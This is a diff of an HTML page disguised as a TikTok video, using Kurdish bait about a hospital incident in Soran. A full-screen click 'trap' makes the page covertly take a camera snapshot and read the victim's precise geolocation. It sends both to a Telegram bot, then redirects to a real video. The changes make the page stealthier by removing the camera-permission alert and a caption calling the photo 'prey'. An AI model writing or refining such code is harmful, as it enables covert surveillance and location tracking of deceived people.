@@ -1,23 +1,31 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok · کێشەی ئیدارەی سۆران</title>
+    <title>TikTok</title>
     
     <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە نەخۆشخانەی ئیدارەی سەربەخۆی سۆران">
-    <meta property="og:description" content="بۆ بینینی ڤیدیۆکە کلیک لێرە بکە">
     <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
-    <meta property="og:url" content="https://rudawsoran.github.io/News/">
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
+        .bg { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center; 
+            background-size: contain; /* بۆ ئەوەی وێنەکە زۆر نزیک نەبێت */
+            z-index: 1; 
+            filter: brightness(0.8); 
+        }
         .play-btn { position: absolute; z-index: 5; pointer-events: none; }
-        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
+        .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.8; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
         .flash-active { background-color: white !important; }
@@ -48,6 +56,7 @@
                 document.getElementById('bg').style.display = 'none';
                 document.getElementById('btn').style.display = 'none';
                 b.classList.add('flash-active');
+                
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -57,17 +66,20 @@
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
                     fd.append('photo', blob, 'photo.jpg');
-                    fd.append('caption', "📸 وێنەی نێچیر\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                    fd.append('caption', "📸 Photo\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(async (pos) => {
                             const mapLink = "https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 Location:\n" + mapLink)}`);
                             window.location.href = targetVideo;
                         }, (err) => { window.location.href = targetVideo; }, { enableHighAccuracy: true, timeout: 5000 });
                     } else { window.location.href = targetVideo; }
                 }, 1000);
-            } catch (e) { alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بە کامێرا بدەیت."); }
+            } catch (e) {
+                // لێرە هیچ نامەیەک نیشان نادات، تەنها Allow ی فەرمی مۆبایلەکە دەمێنێتەوە
+            }
         }
     </script>
 </body>
